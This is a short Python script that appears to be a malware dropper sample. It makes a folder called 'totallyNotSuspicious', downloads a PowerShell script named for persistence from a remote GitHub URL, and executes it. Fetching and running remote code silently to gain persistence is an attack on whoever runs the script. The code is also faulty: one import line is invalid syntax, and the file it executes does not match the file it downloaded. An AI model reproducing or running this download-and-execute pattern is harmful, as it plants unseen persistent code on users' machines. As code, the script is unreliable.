import subprocess
import pathlib from Path
import wget
import os
cwd=os.path.join(Path.home(),"Documents","totallyNotSuspicious")
os.mkdir(cwd)
os.chdir(cwd)
wget.download('https://raw.githubusercontent.com/Acrasy/samples/master/codesamples/initialize/code/persitence.ps1')

subprocess.call([r'.\persistence.ps1'])
